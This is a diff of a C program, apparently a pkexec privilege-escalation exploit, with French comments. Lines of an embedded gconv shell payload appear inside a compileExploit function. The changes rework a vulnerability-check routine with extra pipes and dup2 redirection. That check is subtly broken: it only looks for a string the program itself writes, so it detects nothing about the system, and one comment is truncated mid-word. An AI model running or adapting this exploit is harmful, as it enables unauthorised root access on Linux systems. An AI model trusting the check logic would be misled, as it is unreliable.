@@ -21,7 +21,7 @@ void compileExploit() {
   }
 
   char * shell =
-    "#include <stdio.h>\n"
+  "#include <stdio.h>\n"
   "#include <stdlib.h>\n"
   "#include <unistd.h>\n"
   "void gconv() {}\n"
@@ -86,8 +86,16 @@ void iconv_open() {
 }
 
 void checkVulnerability() {
-  // Créer un pipe pour échanger des données entre le processus parent et le processus enfant.
+   // Créer un pipe pour échanger des données entre le processus parent et le processus enfant.
   pipe(pipefd);
+
+  // Créer un second pipe pour lire les résultats de la détection de vulnérabilité
+  int result_pipefd[2];
+  if (pipe(result_pipefd) == -1) {
+    perror("pipe");
+    exit(EXIT_FAILURE);
+  }
+
   // Processus enfant
   if (fork() == 0) {
     // Fermer l'extrémité d'écriture du pipe.
@@ -97,13 +105,19 @@ void checkVulnerability() {
     // Fermer l'extrémité de lecture du pipe.
     close(pipefd[0]);
 
+    // Copier le descripteur d'écriture du second pipe dans le descripteur de sortie standard
+    if (dup2(result_pipefd[1], 1) == -1) {
+      perror("dup2");
+      exit(EXIT_FAILURE);
+    }
+
     // Si la chaîne de caractères "pkexec --version" est présente au début
     // du tampon buf, cela signifie que le système n'est pas vulnérable à l'exploit.
     if (strstr(buf, "pkexec --version") != NULL) {
       puts("System is not vulnerable");
       exit(0);
 
-      // Sinon, cela signifie que le système est vulnérable à l'exploit.
+      // Sinon, cela signifie que le système est vulnérable à l'
     } else {
       puts("System vulnerable");
     }
@@ -111,8 +125,23 @@ void checkVulnerability() {
     exit(0);
   }
 
+  // Fermer l'extrémité de lecture du premier pipe et de l'extrémité d'écriture du second pipe dans le processus parent.
   close(pipefd[0]);
+  close(result_pipefd[1]);
+
+  // Écrire sur l'extrémité d'écriture du premier pipe.
+  write(pipefd[1], "pkexec --version", strlen("pkexec --version"));
+
+  // Fermer l'extrémité d'écriture du premier pipe.
   close(pipefd[1]);
+
+  // Lire les résultats de la détection de vulnérabilité à partir du second pipe.
+  char buffer[256];
+  ssize_t num_read = read(result_pipefd[0], buffer, sizeof(buffer));
+  if (num_read == -1) {
+    perror("read");
+    exit(EXIT_FAILURE);
+  }
 }
 
 int main(int argc, char * argv[]) {
